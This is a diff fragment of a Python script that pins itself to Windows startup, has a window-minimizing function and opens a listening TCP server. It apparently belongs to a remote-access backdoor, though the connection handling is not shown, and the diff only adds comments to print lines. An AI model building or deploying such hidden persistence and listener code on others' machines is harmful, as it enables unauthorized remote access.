@@ -23,7 +23,7 @@ def pin_to_windows_startup():
     shortcut.Targetpath = script_path
     shortcut.WorkingDirectory = os.path.dirname(script_path)
     shortcut.save()
-    print('Script pinned to Windows startup.')
+    print('Script pinned to Windows startup.') #remove this if you want
 pin_to_windows_startup()
 
 def minimize_window():
@@ -35,7 +35,7 @@ server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.bind((SERVER_IP, SERVER_PORT))
 server_socket.listen(1)
 
-print(f'Server listening on {SERVER_IP}:{SERVER_PORT}')
+print(f'Server listening on {SERVER_IP}:{SERVER_PORT}') #remove this if you want aswell
 
 while True:
     client_socket, client_address = server_socket.accept()
